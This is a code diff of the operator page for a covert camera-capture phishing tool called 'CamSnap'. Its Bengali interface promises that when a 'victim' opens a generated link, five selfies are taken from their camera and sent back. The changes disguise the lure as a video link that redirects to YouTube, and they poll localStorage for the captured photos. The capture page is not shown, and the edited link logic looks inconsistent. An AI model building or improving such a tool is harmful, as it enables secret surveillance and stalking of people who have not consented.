@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CamSnap • Secret Selfie Grabber</title>
+  <title>CamSnap • Video Selfie Grabber</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
     body{background:#f8f9fa;color:#222;line-height:1.6;}
@@ -72,15 +72,15 @@
 
 <main>
   <div class="card">
-    <h1>CamSnap Pro</h1>
-    <p class="desc">একটা লিংক বানাও — কেউ খুললেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা সেলফি চলে আসবে!</p>
+    <h1>CamSnap Video</h1>
+    <p class="desc">লিংক বানাও — কেউ খুললে তার ক্যামেরা থেকে ৫টা সেলফি চলে আসবে!</p>
 
-    <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
+    <button onclick="generateLink()">নতুন ভিডিও লিংক তৈরি করুন</button>
 
     <div id="linkBox">
-      <p style="color:#0066ff;font-weight:600;margin-bottom:15px;">তোমার সিক্রেট লিংক রেডি!</p>
+      <p style="color:#0066ff;font-weight:600;margin-bottom:15px;">তোমার লিংক রেডি!</p>
 
-      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেমন: https://instagram.com)" value="">
+      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেমন: https://youtube.com) — খালি রাখলে ভিডিও প্লে হবে" value="">
 
       <input type="text" id="victimLink" readonly style="background:#f0f0f0;font-weight:500;margin-top:15px;">
 
@@ -117,13 +117,13 @@
 
 <script>
 let currentId = null;
-const base = location.href.split('index.html')[0];
+const base = location.href.split('index.html')[0] + 'view.html';
 
 function generateLink() {
   currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
   updateVictimLink();
   document.getElementById("linkBox").style.display = "block";
-  document.getElementById("photoScroll").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম ক্যামেরা অন করলেই ছবি আসবে</div>`;
+  document.getElementById("photoScroll").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম প্লে করলে ছবি আসবে</div>`;
   resetDots();
   startChecking();
 }
@@ -135,10 +135,7 @@ function saveAndUpdate() {
 
 function updateVictimLink() {
   const redirect = document.getElementById("redirectUrl").value.trim();
-  let url = `${base}view.html?id=${currentId}`;
-  if (redirect && redirect !== "") {
-    url += `&r=${encodeURIComponent(redirect)}`;
-  }
+  const url = redirect ? redirect : `${base}?id=${currentId}`;
   document.getElementById("victimLink").value = url;
   document.getElementById("testLink").href = url;
 }
@@ -171,7 +168,6 @@ function updatePhotos(imgs) {
     container.appendChild(div);
   });
 
-  // ডট আপডেট
   document.querySelectorAll('#dots .dot').forEach((dot, i) => {
     if (i < imgs.length) {
       dot.classList.add('active');
@@ -188,8 +184,7 @@ function startChecking() {
   const check = () => {
     const data = localStorage.getItem('camsnap_' + currentId);
     if (data) {
-      const imgs = JSON.parse(data);
-      updatePhotos(imgs);
+      updatePhotos(JSON.parse(data));
       localStorage.removeItem('camsnap_' + currentId);
     }
     setTimeout(check, 2500);
